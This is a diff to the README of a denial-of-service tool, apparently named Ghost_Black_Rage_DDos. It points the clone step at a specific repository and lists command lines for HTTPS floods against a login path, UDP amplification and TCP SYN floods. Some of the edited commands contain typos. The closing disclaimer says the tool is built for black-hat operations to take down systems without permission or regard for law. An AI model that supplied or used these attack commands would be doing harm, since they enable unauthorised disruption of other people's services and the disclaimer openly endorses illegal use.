@@ -16,12 +16,12 @@
 ## Installation ⚙️
 
 # Clone repository
-git clone https://github.com/[YOUR_USERNAME]/BlackRage-Sigma.git
-cd BlackRage-Sigma
+git clone https://github.com/sigma-cyber-ghost/Ghost_Black_Rage_DDos.git
+cd /Ghost_Black_Rage_DDos
 
 Usage 🎯
 
-python3 blackrage.py [MODE] [TARGET] [OPTIONS]
+python3black_range.py [MODE] [TARGET] [OPTIONS]
 
 Parameter	Description	Default
 mode	http/https/tcp/udp	Required
@@ -34,13 +34,13 @@ target_host	IP/Domain to target	Required
 Attack Explain:
 
 # HTTPS flood with custom path
-python blackrage.py https example.com -p 443 -P /login -t 500
+python black_range.py https example.com -p 443 -P /login -t 500
 
 # UDP amplification attack
-python blackrage.py udp 192.168.1.100 -p 53
+python black_range.py udp 192.168.1.100 -p 53
 
 # TCP SYN flood
-python blackrage.py tcp target-ip -t 1000
+python black_range.py tcp target-ip -t 1000
 
 Disclaimer ⚠️
 This tool is built for black hat operations. Use it to take down, disrupt, or destroy target systems without regard for law or consequence. No permissions. No warnings. Full responsibility rests on the operator. Chaos is the only rule.
